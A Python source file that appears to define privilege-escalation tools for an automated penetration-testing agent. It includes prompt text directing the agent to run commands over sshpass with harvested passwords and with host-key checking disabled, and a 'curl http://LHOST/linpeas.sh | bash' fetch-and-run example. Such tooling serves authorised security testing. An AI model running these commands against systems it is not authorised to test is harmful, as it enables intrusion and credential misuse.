from backend.tools.base import tool, run_command

_SSHPASS_HINT = (
    "[ERROR] No command provided. These tools run on YOUR machine, not the target. "
    "You MUST wrap the command with sshpass to run remotely:\n"
    "  sshpass -p 'PASSWORD' ssh -o StrictHostKeyChecking=no USER@TARGET 'COMMAND'\n"
    "Check the attack graph for discovered credentials."
)


@tool(
    name='run_linpeas',
    description='Run LinPEAS privilege escalation enumeration on the target. IMPORTANT: Command must use sshpass to run remotely, e.g.: sshpass -p \'PASS\' ssh -o StrictHostKeyChecking=no user@target \'curl http://LHOST/linpeas.sh | bash\'',
    parameters={
        'type': 'object',
        'properties': {
            'command': {'type': 'string', 'description': 'Full SSH command to download and run linpeas on target'},
        },
        'required': ['command'],
    },
    phases=['privesc'],
)
async def run_linpeas(command: str) -> str:
    return await run_command(command, timeout=300)


@tool(
    name='check_sudo',
    description='Check sudo privileges on the target. IMPORTANT: Command must use sshpass to run remotely, e.g.: sshpass -p \'PASS\' ssh -o StrictHostKeyChecking=no user@target \'sudo -l\'',
    parameters={
        'type': 'object',
        'properties': {
            'command': {'type': 'string', 'description': 'Full SSH command to check sudo on target'},
        },
        'required': ['command'],
    },
    phases=['privesc'],
)
async def check_sudo(command: str = '') -> str:
    if not command:
        return _SSHPASS_HINT
    return await run_command(command)


@tool(
    name='check_suid',
    description='Find SUID binaries on the target. IMPORTANT: Command must use sshpass to run remotely, e.g.: sshpass -p \'PASS\' ssh -o StrictHostKeyChecking=no user@target \'find / -perm -4000 -type f 2>/dev/null\'',
    parameters={
        'type': 'object',
        'properties': {
            'command': {'type': 'string', 'description': 'Full SSH command to find SUID binaries on target'},
        },
        'required': ['command'],
    },
    phases=['privesc'],
)
async def check_suid(command: str = '') -> str:
    if not command:
        return _SSHPASS_HINT
    return await run_command(command)


@tool(
    name='check_cron',
    description='Check for exploitable cron jobs on the target. IMPORTANT: Command must use sshpass to run remotely, e.g.: sshpass -p \'PASS\' ssh -o StrictHostKeyChecking=no user@target \'cat /etc/crontab; ls -la /etc/cron.d/\'',
    parameters={
        'type': 'object',
        'properties': {
            'command': {'type': 'string', 'description': 'Full SSH command to check cron on target'},
        },
        'required': ['command'],
    },
    phases=['privesc'],
)
async def check_cron(command: str = '') -> str:
    if not command:
        return _SSHPASS_HINT
    return await run_command(command)


@tool(
    name='check_capabilities',
    description='Check for Linux capabilities on the target (e.g. cap_setuid = instant root). '
                'IMPORTANT: Command must use sshpass to run remotely, e.g.: '
                "sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no user@target 'getcap -r / 2>/dev/null'",
    parameters={
        'type': 'object',
        'properties': {
            'command': {'type': 'string', 'description': 'Full SSH command to check capabilities on target'},
        },
        'required': ['command'],
    },
    phases=['privesc'],
)
async def check_capabilities(command: str = '') -> str:
    if not command:
        return _SSHPASS_HINT
    return await run_command(command)
